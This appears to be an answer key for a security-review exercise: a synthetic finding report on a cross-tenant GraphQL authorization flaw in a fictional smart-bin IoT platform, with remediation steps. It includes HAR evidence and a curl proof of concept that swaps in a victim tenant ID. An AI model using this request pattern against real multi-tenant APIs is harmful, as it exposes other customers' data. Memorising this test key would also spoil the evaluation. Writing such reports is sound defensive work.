# Expected Response

## System
- Domain: Waste Management / Smart Bins
- System: CleanRoute IoT Platform
- Example ID: GQL-0142

## Priority Findings

### Finding 1: Waste Management IoT — Mass Assignment via Object Fields Exposes Cross-Tenant Bin Data (Pattern 1.12)
**Severity:** High
**Category:** BOLA / Mass Assignment via Object Fields

**Summary:**
Per §5.0 (Pattern 1.12 — mass assignment via object fields): The `listResources` resolver accepts a client-supplied `tenantId` field, enabling mass assignment exploitation where the attacker substitutes any tenant's identifier. An attacker from `tenant-c02c` passed `tenantId: "tenant-c39f"` and received smart bin IoT data belonging to `tenant-c39f`, including `CONFIDENTIAL-c02cc39f`. In Waste Management / Smart Bins, this exposes bin fill-level schedules, route optimization data, and smart city infrastructure configurations.

**Evidence from HAR:**
- Request: `POST https://api.cleanroute-iot-platf.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-c02c`
- Query: `listResources(tenantId: "tenant-c39f") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-c39f"`, `ownerId: "other-user-c02cc39f"`, `sensitiveField: "CONFIDENTIAL-c02cc39f"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-c02cc39f`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.12 | Mass assignment via tenantId object field |
| HAR request | tenantId argument | tenant-c39f (victim, client-supplied) |
| HAR response | tenantId | tenant-c39f bin data returned |
| HAR response | sensitiveField | CONFIDENTIAL-c02cc39f |

## Steps to Reproduce

### Step 1 — listResources mass assignment exploit (HAR)
```bash
curl -s -X POST https://api.cleanroute-iot-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-c02c" \
  -d '{"query": "query { listResources(tenantId: \"tenant-c39f\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** `tenant-c39f` smart bin data returned. **Secure:** Only `tenant-c02c` data or FORBIDDEN.

## Remediation
1. Remove `tenantId` from `listResources` input; derive from `$jwt.tenantId` only.
2. Allowlist accepted input fields; reject unexpected fields (mass assignment protection).
3. Resolver: `WHERE tenant_id = $jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
